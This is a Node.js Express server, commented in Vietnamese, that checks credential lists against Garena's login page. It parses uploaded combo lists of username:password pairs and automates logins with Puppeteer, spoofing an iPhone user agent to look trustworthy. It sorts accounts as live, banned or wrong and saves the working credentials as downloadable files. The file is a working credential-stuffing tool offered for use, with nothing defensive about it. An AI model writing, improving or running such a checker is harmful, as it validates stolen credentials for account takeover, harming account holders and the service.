const express = require('express');
const multer = require('multer');
const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');
const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
app.use('/temp', express.static(tempDir));

async function checkBanLive(user, pass) {
    let browser;
    try {
        browser = await puppeteer.launch({
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        });
        const page = await browser.newPage();
        // Giả lập iPhone 14 Pro Max để Garena tin tưởng hơn
        await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1');
        
        await page.goto('https://sso.garena.com/ui/login?app_id=10100', { waitUntil: 'networkidle2', timeout: 60000 });
        
        await page.type('input[placeholder*="Username"]', user, { delay: 100 });
        await page.type('input[placeholder*="Password"]', pass, { delay: 100 });
        await page.click('#confirm_btn');

        // Đợi 5 giây để Garena xử lý lệnh đăng nhập
        await new Promise(r => setTimeout(r, 5000)); 

        const content = await page.content();
        const url = page.url();

        // 1. Kiểm tra nếu bị BAN
        if (content.includes('Tài khoản của bạn đã bị khóa') || content.includes('account_banned')) return "BANNED";
        
        // 2. Kiểm tra nếu SAI TK/MK
        if (content.includes('Tên đăng nhập hoặc mật khẩu không đúng')) return "WRONG";
        
        // 3. Kiểm tra nếu SỐNG (Dựa trên URL hoặc nội dung trang cá nhân)
        if (url.includes('account.garena.com') || content.includes('security') || content.includes('Thay đổi mật khẩu')) {
            return "LIVE";
        }

        return "ERROR"; 
    } catch (e) {
        return "TIMEOUT";
    } finally {
        if (browser) await browser.close();
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/scan', upload.single('file'), async (req, res) => {
    if (!req.file) return res.status(400).send('No file.');
    
    const content = req.file.buffer.toString('utf8');
    const regex = /result = (.*?):(.*?)\s\|/g;
    let match, liveColon = "", livePipe = "", results = [];

    while ((match = regex.exec(content)) !== null) {
        const u = match[1].trim(), p = match[2].trim();
        const status = await checkBanLive(u, p);
        
        if (status === "LIVE") {
            liveColon += `${u}:${p}\n`;
            livePipe += `${u}|${p}\n`;
            results.push({ acc: `${u}:${p}`, st: "SỐNG ✅" });
        } else {
            results.push({ acc: `${u}:${p}`, st: status === "BANNED" ? "BAN ❌" : "LỖI/SAI ⚠️" });
        }
    }

    const id = Date.now();
    fs.writeFileSync(path.join(tempDir, `live_colon_${id}.txt`), liveColon);
    fs.writeFileSync(path.join(tempDir, `live_pipe_${id}.txt`), livePipe);

    res.json({ data: results, dlColon: `/temp/live_colon_${id}.txt`, dlPipe: `/temp/live_pipe_${id}.txt` });
});

app.listen(process.env.PORT || 3000);
